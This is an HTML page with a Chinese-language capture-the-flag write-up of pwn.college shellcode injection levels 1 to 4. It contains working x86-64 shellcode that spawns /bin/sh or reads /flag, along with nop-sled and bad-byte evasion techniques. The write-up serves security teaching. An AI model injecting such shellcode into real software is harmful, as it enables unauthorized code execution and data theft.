@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-T952MB6B');</script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="這裏好像需要有匯編的知識，和linux的知識。 Quick Review: How to Write a shellcode ?12345678910.global _start_start:    .intel_syntax noprefix    mov rax, 59     # this is the syscall number of execve    lea rdi, [rip+bi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn.College - Shellcode Injection">
+<meta property="og:url" content="https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="這裏好像需要有匯編的知識，和linux的知識。 Quick Review: How to Write a shellcode ?12345678910.global _start_start:    .intel_syntax noprefix    mov rax, 59     # this is the syscall number of execve    lea rdi, [rip+bi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727075726-dh1z52r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727084530-xbyqkn7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727094749-y76ybd5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727130441-mo63hiw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727152717-hrw4kq2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727153408-m90p3yt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727153529-45qt12g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727154321-jo8ov5q.png">
+<meta property="article:published_time" content="2024-07-27T08:52:00.000Z">
+<meta property="article:modified_time" content="2024-07-27T08:50:14.458Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727075726-dh1z52r.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Pwn.College - Shellcode Injection</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/27/2024-htb-machine/29-GreenHorn/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/26/2024/0726-pwn-college-Debugging-Refresher/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&text=Pwn.College - Shellcode Injection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&is_video=false&description=Pwn.College - Shellcode Injection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn.College - Shellcode Injection&body=Check out this article: https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&name=Pwn.College - Shellcode Injection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&t=Pwn.College - Shellcode Injection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Review-How-to-Write-a-shellcode"><span class="toc-number">1.</span> <span class="toc-text">Quick Review: How to Write a shellcode ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lebel-3"><span class="toc-number">4.</span> <span class="toc-text">Lebel 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">5.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">6.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">7.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">8.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">9.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">10.</span> <span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">11.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11"><span class="toc-number">12.</span> <span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12"><span class="toc-number">13.</span> <span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">14.</span> <span class="toc-text">Level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-14"><span class="toc-number">15.</span> <span class="toc-text">Level 14</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Pwn.College - Shellcode Injection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-27T08:52:00.000Z" class="dt-published" itemprop="datePublished">2024-07-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>這裏好像需要有匯編的知識，和linux的知識。</p>
+<h2 id="Quick-Review-How-to-Write-a-shellcode"><a href="#Quick-Review-How-to-Write-a-shellcode" class="headerlink" title="Quick Review: How to Write a shellcode ?"></a>Quick Review: How to Write a shellcode ?</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">    .intel_syntax</span> noprefix</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">59</span>     # this is the <span class="keyword">syscall</span> number of execve</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, [<span class="built_in">rip</span>+binsh]    # points the first argument of execve <span class="meta">at</span> the /bin/sh string below</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span>      # this makes the second argument, argv, NULL</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span>      # this makes the third argument, envp, NULL</span><br><span class="line">    <span class="keyword">syscall</span>         # this triggers the system <span class="keyword">call</span></span><br><span class="line"><span class="symbol">binsh:</span>              # a label marking where the /bin/sh string is</span><br><span class="line"><span class="meta">    .string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>根據syscall來執行shellcode，參考寄存器：<a target="_blank" rel="noopener" href="https://syscall.sh/">https://syscall.sh/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -nostdlib -static shellcode.s -o shellcode-elf</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>shellcode-elf</code>​ ，可以直接運行，你會得到一個shell，或者複製到某個有漏洞的程序中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy --dump-section .text=shellcode-raw shellcode-elf</span><br><span class="line"></span><br><span class="line">$ xxd shellcode-raw </span><br><span class="line">00000000: 48c7 c03b 0000 0048 8d3d 1000 0000 48c7  H..;...H.=....H.</span><br><span class="line">00000010: c600 0000 0048 c7c2 0000 0000 0f05 2f62  .....H......../b</span><br><span class="line">00000020: 696e 2f73 6800                           <span class="keyword">in</span>/sh.</span><br></pre></td></tr></table></figure>
+
+<p>但是這種會有很多 <code>x00</code>​，因爲程序以爲你已經輸入完了，實際上并沒有，這些會稱爲 <code>bad char</code>​，繞過的方法也有很多。</p>
+<p>‍</p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>沒有任何限制，寫一個讀取shellcode的匯編，</p>
+<p>只需要 <code>sendfile(1, open(&quot;/flag&quot;, NULL), 0, 1000)</code>​ 即可。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # craft flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # open (<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # send file to stdout</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">40</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">1000</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><blockquote>
+<p>This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this<br>is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>​, before the<br>actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly<br>execute and then your real shellcode will run. This concept is called a <code>nop sled</code>​.</p>
+</blockquote>
+<p>他的意思是你的shellcode會跳過 0x800 個，所以用nop填充起來就好了：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # <span class="keyword">add</span> <span class="number">0x800</span> <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0x800</span></span><br><span class="line">        <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line">   </span><br><span class="line">    # open (<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # send file to stdout</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">40</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">1000</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lebel-3"><a href="#Lebel-3" class="headerlink" title="Lebel 3"></a>Lebel 3</h2><blockquote>
+<p>This challenge requires that your shellcode have no NULL bytes!</p>
+</blockquote>
+<p>不可以出現 null bytes</p>
+<p>可以使用 objdump -d 來看shellcode的代碼有沒有出現 x00，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727075726-dh1z52r.png" alt="image">​</p>
+<p>如果是向 <code>mov rax,0x10</code>​ 就會有00，這個時候可以使用 <code>mov rax,0xffffffffffffff00</code>​ ，然後使用 <code>shl rax,56</code>​ 向左 shift 56次，然後向右shift 56次就得到 0x10。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # craft flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0xffffff67616c662f</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">shr</span> <span class="built_in">rax</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # mox <span class="built_in">rax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # open(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # send file to stdout</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line"></span><br><span class="line">    #<span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">40</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0xffffffffffffff28</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">56</span></span><br><span class="line">    <span class="keyword">shr</span> <span class="built_in">rax</span>, <span class="number">56</span></span><br><span class="line"></span><br><span class="line">    #<span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line"></span><br><span class="line">    #<span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">1000</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">0xfffffffffffff3E8</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">r10</span>, <span class="number">52</span></span><br><span class="line">    <span class="keyword">shr</span> <span class="built_in">r10</span>, <span class="number">52</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # exit</span><br><span class="line">    #<span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0xffffffffffffff3c</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">56</span></span><br><span class="line">    <span class="keyword">shr</span> <span class="built_in">rax</span>, <span class="number">56</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><blockquote>
+<p>This challenge requires that your shellcode have no H bytes!</p>
+</blockquote>
+<p>一開始我還沒看懂他在説什麽，原來不可以有 H， H 就是 0x48， 也就是你的shell code 中不可以出現 0x48，這樣就只能使用32位的匯編了。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727084530-xbyqkn7.png" alt="image">​</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # open(<span class="string">&#x27;/flag&#x27;</span>, NULL, NULL)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">edi</span>, [<span class="built_in">eip</span> + _flag]</span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # sendfile(<span class="number">1</span>, flag_fd, <span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10b</span>, <span class="number">0x64</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">40</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    #exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"># 因爲沒有辦法用 stack，所以需要找個地方放。</span><br><span class="line"><span class="symbol">_flag:</span> .ascii <span class="string">&quot;/flag&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
+<p>Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?</p>
